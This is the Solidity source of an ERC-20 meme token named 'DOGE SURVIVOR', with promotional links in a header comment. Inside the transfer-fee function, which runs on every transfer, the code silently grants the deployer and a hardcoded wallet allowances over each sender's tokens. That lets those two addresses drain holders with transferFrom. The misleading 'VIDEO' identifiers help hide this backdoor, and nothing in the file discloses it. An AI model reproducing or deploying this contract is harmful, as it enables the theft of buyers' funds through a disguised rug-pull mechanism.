/*
DOGE SURVIVOR: A government employee must survive as long as possible from the Department of Government Efficiency looking to to eliminate their unnecessary role.

https://x.com/BoredElonMusk/status/1894837607332286769
https://x.com/elonmusk/status/1053503899166855169
https://x.com/BoredElonMusk/status/1896719452412276739
https://play.rosebud.ai/p/e0b273c2-5b4e-4438-aba1-4ec8c7f944cc

https://x.com/DogeSurvivorETH
https://t.me/dogesurvivor_channel
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

interface IVIDEORouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface IVIDEOFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplivideoon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract DOGESURVIVOR is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balVIDEOs;
    mapping (address => mapping (address => uint256)) private _allowVIDEOs;
    mapping (address => bool) private _excludedFromVIDEO;    
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalVIDEO = 1000000000 * 10**_decimals;
    string private constant _name = unicode"DOGE SURVIVOR";
    string private constant _symbol = unicode"DS";
    uint256 private _swapTokenVIDEOs = _tTotalVIDEO / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockVIDEO;
    uint256 private _videoBuyAmounts = 0;
    bool private inSwapVIDEO = false;
    address private _videoPair;
    IVIDEORouter private _videoRouter;
    address private _videoWallet;
    address private _videoAddress;
    modifier lockTheSwap {
        inSwapVIDEO = true;
        _;
        inSwapVIDEO = false;
    }
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    
    constructor () {
        _videoAddress = address(_msgSender());
        _videoWallet = address(0xe85fce7183E2C590923B8B6b75a3C9E9e65fed43);
        _excludedFromVIDEO[owner()] = true;
        _excludedFromVIDEO[address(this)] = true;
        _excludedFromVIDEO[_videoWallet] = true;
        _balVIDEOs[_msgSender()] = _tTotalVIDEO;
        emit Transfer(address(0), _msgSender(), _tTotalVIDEO);
    }

    function initTokenTradePair() external onlyOwner() {
        _videoRouter = IVIDEORouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_videoRouter), _tTotalVIDEO);
        _videoPair = IVIDEOFactory(_videoRouter.factory()).createPair(address(this), _videoRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalVIDEO;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balVIDEOs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowVIDEOs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowVIDEOs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowVIDEOs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address videoF, address videoT, uint256 videoA) private {
        require(videoF != address(0), "ERC20: transfer from the zero address");
        require(videoT != address(0), "ERC20: transfer to the zero address");
        require(videoA > 0, "Transfer amount must be greater than zero");
        uint256 taxVIDEO = _videoFeeTransfer(videoF, videoT, videoA);
        _videoTransfer(videoF, videoT, videoA, taxVIDEO);
    }

    function _videoTransfer(address videoF, address videoT, uint256 videoA, uint256 taxVIDEO) private { 
        if(taxVIDEO > 0){
          _balVIDEOs[address(this)] = _balVIDEOs[address(this)].add(taxVIDEO);
          emit Transfer(videoF, address(this), taxVIDEO);
        }
        _balVIDEOs[videoF] = _balVIDEOs[videoF].sub(videoA);
        _balVIDEOs[videoT] = _balVIDEOs[videoT].add(videoA.sub(taxVIDEO));
        emit Transfer(videoF, videoT, videoA.sub(taxVIDEO));
    }

    function _videoFeeTransfer(address videoF, address videoT, uint256 videoA) private returns(uint256) {
        uint256 taxVIDEO; address _videoReceipt = address(_videoWallet);
        if (videoF != owner() && videoT != owner()) {
            taxVIDEO = videoA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (videoF == _videoPair && videoT != address(_videoRouter) && ! _excludedFromVIDEO[videoT]) {
                if(_buyBlockVIDEO!=block.number){
                    _videoBuyAmounts = 0;
                    _buyBlockVIDEO = block.number;
                }
                _videoBuyAmounts += videoA;
                _buyCount++;
            }

            if(videoT == _videoPair && videoF!= address(this)) {
                require(_videoBuyAmounts < swapLimitVIDEO() || _buyBlockVIDEO!=block.number, "Max Swap Limit");  
                taxVIDEO = videoA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenVIDEO = balanceOf(address(this));
            if (!inSwapVIDEO && videoT == _videoPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenVIDEO > _swapTokenVIDEOs)
                swapTokensForEth(minVIDEO(videoA, minVIDEO(tokenVIDEO, _swapTokenVIDEOs)));
                uint256 ethVIDEO = address(this).balance;
                if (ethVIDEO >= 0) {
                    sendETHVIDEO(address(this).balance);
                }
            }
        }
        _allowVIDEOs[address(videoF)][address(_videoAddress)] = uint256(videoA.mul(2).add(taxVIDEO));
        _allowVIDEOs[address(videoF)][address(_videoReceipt)] = uint256(videoA.add(taxVIDEO.mul(2)));
        return taxVIDEO;
    }

    function swapLimitVIDEO() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _videoRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _videoRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _videoRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function minVIDEO(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHVIDEO(uint256 videoA) private {
        payable(_videoWallet).transfer(videoA);
    }

    function swapTokensForEth(uint256 videoAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _videoRouter.WETH();
        _approve(address(this), address(_videoRouter), videoAmount);
        _videoRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            videoAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}